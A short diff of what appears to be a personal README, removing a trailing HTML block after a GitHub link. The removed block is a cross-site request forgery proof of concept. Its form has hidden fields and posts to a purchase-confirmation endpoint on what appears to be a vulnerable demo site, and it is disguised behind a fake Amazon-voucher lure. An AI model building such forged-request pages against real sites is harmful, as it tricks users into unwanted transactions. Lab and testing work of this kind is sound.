@@ -63,16 +63,3 @@ That's it, That's lame😛.!
 
 # 𝐆𝐢𝐭𝐡𝐮𝐛
 https://github.com/m4xx101
-
-<html>
-  <body>
-    <form action="http://foophones.securitybrigade.com:8080/buy_confirm.php" method="POST">
-      <input type="hidden" name="shipping" value="abc" />
-      <h1>Click Here for $500 worthy Amazon vouchers.!!!</h1>
-      <br/>
-      <input type="hidden" name="price" value="29" />
-      <input type="hidden" name="id" value="2" />
-      <input type="submit" value="Amazon Vouchers" />
-    </form>
-  </body>
-</html>
